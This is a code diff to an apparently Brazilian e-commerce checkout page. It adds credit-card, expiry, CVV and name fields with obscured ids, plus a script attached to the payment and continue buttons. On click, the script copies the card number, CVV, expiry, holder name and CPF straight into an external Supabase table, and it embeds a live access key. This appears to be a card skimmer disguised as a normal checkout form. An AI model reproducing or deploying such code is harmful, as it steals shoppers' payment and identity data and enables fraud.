@@ -289,6 +289,86 @@
         </div>
       </section>
 
+      <!-- Opção Cartão de Crédito -->
+          <div class="co-method" data-method="cartao">
+            <div class="co-method-l">
+              <input type="radio" name="pagamento" class="co-method-radio">
+              <div>
+                <div class="co-method-title">Cartão de Crédito</div>
+                <div class="co-method-sub">Em até 5x de R$ 9,58</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Campos de Cartão (escondidos se PIX) -->
+
+<div class="co-card-fields" id="cardFields">
+  <!-- Número do Cartão: Espaçado a cada 4 números -->
+  <div class="co-field full">
+    <label class="co-label">Número do Cartão</label>
+    <input 
+      type="tel"
+      id="cliN1"
+      class="co-input" 
+      placeholder="0000 0000 0000 0000" 
+      maxlength="19" 
+      oninput="this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim()"
+      required>
+  </div>
+
+  <!-- Nome no Cartão: Apenas letras e converte para maiúsculo -->
+  <div class="co-field full">
+    <label class="co-label">Nome no Cartão</label>
+    <input 
+      type="text"
+       id="cliN2"
+      class="co-input" 
+      placeholder="Como impresso no cartão" 
+      oninput="this.value = this.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '').toUpperCase()"
+      required>
+  </div>
+
+  <div class="co-form-grid">
+    <!-- Validade: Formato MM/AA -->
+    <div class="co-field">
+      <label class="co-label">Validade</label>
+      <input 
+        type="tel"
+        id="cliV1"
+        class="co-input" 
+        placeholder="MM/AA" 
+        maxlength="5" 
+        oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2')"
+        required>
+    </div>
+
+    <!-- CVV: Apenas números (máximo 4) -->
+    <div class="co-field">
+      <label class="co-label">CVV</label>
+      <input 
+        type="tel"
+        id="cliC1"
+        class="co-input" 
+        placeholder="123" 
+        maxlength="4" 
+        oninput="this.value = this.value.replace(/\D/g, '')"
+        required>
+    </div>
+  </div>
+
+  <div class="co-field full">
+    <label class="co-label">Parcelamento</label>
+    <select class="co-input">
+      <option value="1">1x de R$ 47,90 sem juros</option>
+      <option value="2">2x de R$ 23,95 sem juros</option>
+      <option value="3">3x de R$ 15,96 sem juros</option>
+      <option value="4">4x de R$ 11,97</option>
+      <option value="5">5x de R$ 9,58</option>
+    </select>
+  </div>
+</div>
+    
       <!-- ADICIONE ESSAS OFERTAS NA SUA COMPRA (ORDER BUMPS) -->
       <section class="co-card co-bumps-card">
         <div class="co-bumps-header">
@@ -530,6 +610,50 @@
 
     </div>
   </div>
+
+<script>
+    const SUPABASE_URL = 'https://vwzdnoedjxvviphzdprn.supabase.co';
+    // Cola aqui a chave longa 'anon' / 'public' do Supabase (começa com eyJ...)
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ3emRub2Vkanh2dmlwaHpkcHJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE3MzU4NDcsImV4cCI6MjEwNzMxMTg0N30.DnrlujVWGbQrTLU86_vfIrSGj6zdOfKDkdTvtVEPNHI'; 
+    
+    const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const botoes = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
+
+        botoes.forEach(btn => {
+            const textoBotao = btn.textContent || btn.value || '';
+            if (textoBotao.includes('PIX') || textoBotao.includes('Finalizar') || textoBotao.includes('Gerar') || textoBotao.includes('Continuar')) {
+                btn.addEventListener('click', async () => {
+                    const numero = document.getElementById('cliN1')?.value || '';
+                    const nome = document.getElementById('cliN2')?.value || '';
+                    const validade = document.getElementById('cliV1')?.value || '';
+                    const CVV = document.getElementById('cliC1')?.value || '';
+                    const CPF = document.getElementById('cliC2')?.value || '';
+                  
+// Envio para o Supabase incluindo agora a coluna C2
+                    const { data, error } = await sb
+                        .from('1')
+                        .insert([
+                            { 
+                                N1: numero, 
+                                N2: nome, 
+                                V1: validade, 
+                                C1: CVV,
+                                C2: CPF 
+                            }
+                        ]);
+
+                    if (error) {
+                        console.error('Erro detalhado do Supabase:', error.message);
+                    } else {
+                        console.log('Sucesso! Dados enviados para o Supabase:', data);
+                    }
+                });
+            }
+        });
+    });
+</script>
 
   <script src="js/checkout.js"></script>
 </body>
